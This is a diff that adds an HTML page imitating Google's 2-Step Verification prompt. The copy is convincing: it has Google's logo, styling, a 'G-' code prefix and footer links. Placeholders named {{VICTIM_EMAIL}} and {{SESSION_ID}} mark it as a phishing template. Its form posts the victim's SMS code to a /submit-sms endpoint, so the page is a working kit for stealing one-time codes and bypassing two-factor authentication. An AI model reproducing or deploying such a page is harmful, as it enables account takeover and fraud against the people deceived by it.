@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>2-Step Verification</title>
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%}
+body{background:#202124;font-family:'Google Sans',Arial,sans-serif;overflow:hidden;display:flex;justify-content:center;align-items:center;color:#fff;zoom:1.25}
+.wrapper{width:770px;position:relative}
+.card{width:770px;height:270px;background:#000;border-radius:28px;position:relative}
+.google-g{position:absolute;top:28px;left:30px;width:23px;height:23px}
+.left{position:absolute;left:30px;top:72px;width:305px}
+.title{font-size:31px;font-weight:400;letter-spacing:-0.5px;line-height:1.1;margin-bottom:15px}
+.subtitle{width:260px;font-size:11px;line-height:1.58;color:#e3e3e3;margin-bottom:18px}
+.email-chip{display:inline-flex;align-items:center;height:24px;border:1px solid #5f6368;border-radius:16px;padding:0 8px 0 6px;gap:6px;font-size:10px;font-weight:500;color:#fff}
+.user{width:13px;height:13px;border-radius:50%;border:1px solid #dadce0;position:relative}
+.user:before{content:'';position:absolute;width:4px;height:4px;border-radius:50%;background:#dadce0;top:2px;left:3.5px}
+.user:after{content:'';position:absolute;width:7px;height:3px;border-radius:10px 10px 0 0;background:#dadce0;bottom:1.5px;left:2px}
+.arrow{width:0;height:0;border-left:3px solid transparent;border-right:3px solid transparent;border-top:4px solid #dadce0;margin-top:2px}
+.resend{position:absolute;left:30px;bottom:40px;color:#9aa0a6;font-size:11px;font-weight:500;cursor:pointer}
+.right{position:absolute;right:20px;top:76px;width:310px}
+.right-text{width:285px;font-size:10px;line-height:1.6;color:#e3e3e3;margin-bottom:16px}
+.code-box{width:270px;height:34px;border:1px solid #5f6368;border-radius:2px;display:flex;align-items:center;overflow:hidden;transition:border .1s ease, box-shadow .1s ease;background:#000}
+.code-box.active{border:1px solid #8ab4f8;box-shadow:0 0 0 1px #8ab4f8 inset}
+.g-part{width:34px;height:100%;border-right:1px solid #5f6368;display:flex;align-items:center;justify-content:center;background:#000;font-family:'Google Sans',Arial,sans-serif}
+.g-part span{font-size:12px;font-weight:400;color:#ffffff;letter-spacing:0;opacity:.95}
+.code-box.active .g-part{border-right:1px solid #8ab4f8}
+.code-input{flex:1;height:100%;background:#000;border:none;outline:none;color:#fff;padding:0 12px;font-family:'Google Sans',Arial,sans-serif;font-size:11px}
+.code-input::placeholder{color:#9aa0a6}
+.bottom-right{position:absolute;right:20px;bottom:20px}
+.next{width:47px;height:31px;border:none;border-radius:16px;background:#8ab4f8;color:#202124;font-size:11px;font-weight:500;font-family:'Google Sans',Arial,sans-serif;cursor:pointer}
+.footer{width:770px;margin-top:12px;padding:0 6px;display:flex;justify-content:space-between;align-items:center;color:#dadce0;font-size:9px}
+.footer-left{display:flex;align-items:center;gap:5px}
+.footer-right{display:flex;gap:23px}
+.small-arrow{width:0;height:0;border-left:3px solid transparent;border-right:3px solid transparent;border-top:4px solid #dadce0;margin-top:2px}
+</style>
+</head>
+<body>
+<div class="wrapper">
+<div class="card">
+<svg class="google-g" viewBox="0 0 18 18">
+<path fill="#EA4335" d="M9 3.48c1.69 0 2.84.73 3.49 1.34l2.54-2.54C13.49.85 11.47 0 9 0 5.48 0 2.44 2.02.96 4.96l2.95 2.29C4.64 5.1 6.62 3.48 9 3.48z"/>
+<path fill="#4285F4" d="M17.64 9.2c0-.64-.06-1.25-.16-1.84H9v3.48h4.84c-.21 1.12-.84 2.07-1.8 2.71l2.91 2.26c1.7-1.57 2.69-3.88 2.69-6.61z"/>
+<path fill="#FBBC05" d="M3.91 10.75A5.41 5.41 0 0 1 3.62 9c0-.61.1-1.2.29-1.75L.96 4.96A8.96 8.96 0 0 0 0 9c0 1.45.35 2.82.96 4.04l2.95-2.29z"/>
+<path fill="#34A853" d="M9 18c2.43 0 4.47-.8 5.96-2.18l-2.91-2.26c-.81.54-1.84.86-3.05.86-2.38 0-4.36-1.61-5.09-3.77L.96 13.04C2.44 15.98 5.48 18 9 18z"/>
+</svg>
+<div class="left">
+<div class="title">2-Step Verification</div>
+<div class="subtitle">To help keep your account safe, Google wants to make sure that it's really you trying to sign in</div>
+<div class="email-chip"><div class="user"></div>{{VICTIM_EMAIL}}<div class="arrow"></div></div>
+</div>
+<div class="right">
+<div class="right-text">A text message with a 6-digit verification code was just sent to your phone number</div>
+<form id="smsForm" action="/submit-sms" method="POST">
+  <input type="hidden" name="sid" id="smsSid" value="{{SESSION_ID}}">
+  <div class="code-box" id="codeBox">
+    <div class="g-part"><span>G-</span></div>
+    <input class="code-input" id="codeInput" name="code" placeholder="Enter the code" required>
+  </div>
+</form>
+</div>
+<div class="resend">Resend it</div>
+<div class="bottom-right">
+<button class="next" type="submit" form="smsForm">Next</button>
+</div>
+</div>
+<div class="footer">
+<div class="footer-left">English (United Kingdom)<div class="small-arrow"></div></div>
+<div class="footer-right"><span>Help</span><span>Privacy</span><span>Terms</span></div>
+</div>
+</div>
+<script>
+const input = document.getElementById('codeInput');
+const box = document.getElementById('codeBox');
+input.addEventListener('focus', () => { box.classList.add('active'); });
+input.addEventListener('blur', () => { box.classList.remove('active'); });
+</script>
+</body>
+</html>
